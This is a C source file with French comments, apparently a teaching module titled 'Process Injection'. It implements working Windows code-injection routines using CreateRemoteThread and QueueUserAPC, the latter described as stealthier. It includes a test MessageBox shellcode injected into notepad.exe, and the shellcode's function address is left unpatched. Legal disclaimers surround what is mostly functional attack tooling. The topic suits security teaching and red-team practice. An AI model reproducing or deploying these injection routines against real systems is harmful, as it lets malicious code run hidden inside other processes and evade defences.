/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                    MODULE 24 : PROCESS INJECTION
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * AVERTISSEMENT LÉGAL CRITIQUE :
 * Ce code est fourni UNIQUEMENT à des fins éducatives pour la cybersécurité.
 * L'utilisation de ces techniques sans autorisation explicite est ILLÉGALE.
 *
 * Utilisez UNIQUEMENT dans :
 *   - Environnements de test isolés (VM déconnectées)
 *   - Contexte de red teaming autorisé par écrit
 *   - Recherche académique légitime
 *
 * Toute utilisation malveillante est strictement interdite et punissable.
 * ═══════════════════════════════════════════════════════════════════════════
 */

#ifdef _WIN32

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                         STRUCTURES ET DÉFINITIONS
 * ═══════════════════════════════════════════════════════════════════════════
 */

// Shellcode de test : MessageBox "Injected!" (x64)
// WARNING: Ce shellcode est DÉTECTABLE et à usage ÉDUCATIF uniquement
unsigned char test_shellcode[] =
    "\x48\x83\xEC\x28"                          // sub rsp, 0x28
    "\x48\x31\xC9"                              // xor rcx, rcx
    "\x48\x8D\x15\x1A\x00\x00\x00"              // lea rdx, [message]
    "\x4C\x8D\x05\x13\x00\x00\x00"              // lea r8, [title]
    "\x48\x31\xC9"                              // xor r9, r9
    "\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00"  // mov rax, MessageBoxA (à patcher)
    "\xFF\xD0"                                  // call rax
    "\x48\x83\xC4\x28"                          // add rsp, 0x28
    "\xC3"                                      // ret
    "Injected!\0"
    "Test\0";

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                        UTILITAIRES PROCESS
 * ═══════════════════════════════════════════════════════════════════════════
 */

/**
 * Trouve le PID d'un processus par son nom
 *
 * @param processName Nom du processus (ex: "notepad.exe")
 * @return PID du processus, ou 0 si non trouvé
 */
DWORD find_process_by_name(const char* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    printf("[+] Recherche du processus : %s\n", processName);

    // Créer un snapshot de tous les processus
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Erreur CreateToolhelp32Snapshot: %lu\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Récupérer le premier processus
    if (!Process32First(hSnapshot, &pe32)) {
        printf("[-] Erreur Process32First: %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }

    // Parcourir tous les processus
    do {
        if (strcmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            printf("[+] Processus trouvé - PID: %lu\n", pid);
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    if (pid == 0) {
        printf("[-] Processus non trouvé\n");
    }

    return pid;
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                    TECHNIQUE 1 : CreateRemoteThread
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Méthode classique d'injection :
 * 1. OpenProcess avec PROCESS_ALL_ACCESS
 * 2. VirtualAllocEx pour allouer de la mémoire dans le processus cible
 * 3. WriteProcessMemory pour écrire le shellcode
 * 4. CreateRemoteThread pour exécuter le shellcode
 */

BOOL inject_create_remote_thread(DWORD pid, void* shellcode, SIZE_T shellcode_size) {
    HANDLE hProcess = NULL;
    LPVOID remoteBuffer = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;

    printf("\n═══════════════════════════════════════════════════════════════\n");
    printf("    TECHNIQUE 1 : CreateRemoteThread Injection\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    printf("[*] PID cible: %lu\n", pid);
    printf("[*] Taille du shellcode: %zu bytes\n", shellcode_size);

    // Étape 1: Ouvrir le processus cible avec tous les droits
    printf("[1] Ouverture du processus...\n");
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
        printf("    Nécessite des privilèges administrateur!\n");
        return FALSE;
    }
    printf("[+] Handle du processus obtenu: 0x%p\n", hProcess);

    // Étape 2: Allouer de la mémoire dans le processus distant
    printf("[2] Allocation de mémoire dans le processus distant...\n");
    remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // RWX: détectable par EDR!
    );

    if (remoteBuffer == NULL) {
        printf("[-] Erreur VirtualAllocEx: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Mémoire allouée à: 0x%p\n", remoteBuffer);

    // Étape 3: Écrire le shellcode dans la mémoire distante
    printf("[3] Écriture du shellcode...\n");
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcode_size, &bytesWritten)) {
        printf("[-] Erreur WriteProcessMemory: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] %zu bytes écrits\n", bytesWritten);

    // Étape 4: Créer un thread distant pour exécuter le shellcode
    printf("[4] Création du thread distant...\n");
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteBuffer,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("[-] Erreur CreateRemoteThread: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Thread créé avec succès! Handle: 0x%p\n", hThread);

    // Attendre que le thread se termine (optionnel)
    printf("[*] Attente de l'exécution du shellcode...\n");
    WaitForSingleObject(hThread, INFINITE);

    success = TRUE;
    printf("[+] Injection CreateRemoteThread réussie!\n");

cleanup:
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);

    return success;
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                    TECHNIQUE 2 : QueueUserAPC
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Injection via APC (Asynchronous Procedure Call) :
 * - Plus furtive que CreateRemoteThread
 * - Le code s'exécute quand le thread est en état "alertable"
 * - Nécessite de trouver un thread en attente
 */

BOOL inject_queue_user_apc(DWORD pid, void* shellcode, SIZE_T shellcode_size) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID remoteBuffer = NULL;
    BOOL success = FALSE;

    printf("\n═══════════════════════════════════════════════════════════════\n");
    printf("    TECHNIQUE 2 : QueueUserAPC Injection\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    // Ouvrir le processus
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
        return FALSE;
    }

    // Allouer la mémoire
    remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcode_size,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("[-] Erreur VirtualAllocEx: %lu\n", GetLastError());
        goto cleanup;
    }

    // Écrire le shellcode
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcode_size, &bytesWritten)) {
        printf("[-] Erreur WriteProcessMemory: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Shellcode écrit à 0x%p\n", remoteBuffer);

    // Trouver un thread du processus pour l'APC
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Erreur CreateToolhelp32Snapshot\n");
        goto cleanup;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    printf("[*] Recherche d'un thread alertable...\n");

    if (Thread32First(hSnapshot, &te32)) {
        do {
            // Trouver un thread du processus cible
            if (te32.th32OwnerProcessID == pid) {
                hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                if (hThread != NULL) {
                    printf("[+] Thread trouvé - TID: %lu\n", te32.th32ThreadID);

                    // Ajouter l'APC à la queue du thread
                    if (QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, 0)) {
                        printf("[+] APC ajouté avec succès!\n");
                        printf("[*] Le shellcode s'exécutera quand le thread sera alertable\n");
                        success = TRUE;
                    } else {
                        printf("[-] Erreur QueueUserAPC: %lu\n", GetLastError());
                    }

                    CloseHandle(hThread);
                    break;
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);

cleanup:
    if (hProcess) CloseHandle(hProcess);

    return success;
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                         DÉMONSTRATIONS
 * ═══════════════════════════════════════════════════════════════════════════
 */

void demo_process_injection(void) {
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║        MODULE 24 : DÉMONSTRATION PROCESS INJECTION           ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    printf("\n⚠️  AVERTISSEMENT ⚠️\n");
    printf("Ce code est à usage ÉDUCATIF UNIQUEMENT!\n");
    printf("Utilisation sur des systèmes sans autorisation = ILLÉGAL\n\n");

    // Pour la démo, on cherche notepad.exe
    // L'utilisateur doit lancer notepad.exe manuellement d'abord
    printf("INSTRUCTIONS:\n");
    printf("1. Lancez notepad.exe manuellement\n");
    printf("2. Exécutez ce programme avec droits administrateur\n");
    printf("3. Le shellcode sera injecté dans notepad\n\n");

    const char* target_process = "notepad.exe";
    DWORD pid = find_process_by_name(target_process);

    if (pid == 0) {
        printf("\n[-] Processus %s non trouvé!\n", target_process);
        printf("[*] Lancez notepad.exe et réessayez\n");
        return;
    }

    printf("\n[*] Sélectionnez la technique d'injection:\n");
    printf("1. CreateRemoteThread (classique)\n");
    printf("2. QueueUserAPC (plus furtif)\n");
    printf("Choix (1-2): ");

    int choice;
    if (scanf("%d", &choice) != 1) {
        printf("[-] Entrée invalide\n");
        return;
    }

    BOOL result = FALSE;

    switch (choice) {
        case 1:
            result = inject_create_remote_thread(pid, test_shellcode, sizeof(test_shellcode));
            break;
        case 2:
            result = inject_queue_user_apc(pid, test_shellcode, sizeof(test_shellcode));
            break;
        default:
            printf("[-] Choix invalide\n");
            return;
    }

    if (result) {
        printf("\n[✓] Injection réussie!\n");
    } else {
        printf("\n[✗] Injection échouée\n");
        printf("[*] Vérifiez que vous avez les privilèges administrateur\n");
    }
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                         FONCTION PRINCIPALE
 * ═══════════════════════════════════════════════════════════════════════════
 */

int main(void) {
    // Vérifier les privilèges
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    if (!isElevated) {
        printf("\n⚠️  ATTENTION: Ce programme nécessite des privilèges administrateur!\n");
        printf("Relancez en tant qu'administrateur pour utiliser les fonctionnalités d'injection.\n\n");
    }

    demo_process_injection();

    printf("\n");
    return 0;
}

#else

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                      PLATEFORME NON-WINDOWS
 * ═══════════════════════════════════════════════════════════════════════════
 */

#include <stdio.h>

int main(void) {
    printf("Ce module est spécifique à Windows.\n");
    printf("Compilez et exécutez sur un système Windows.\n");
    return 1;
}

#endif /* _WIN32 */
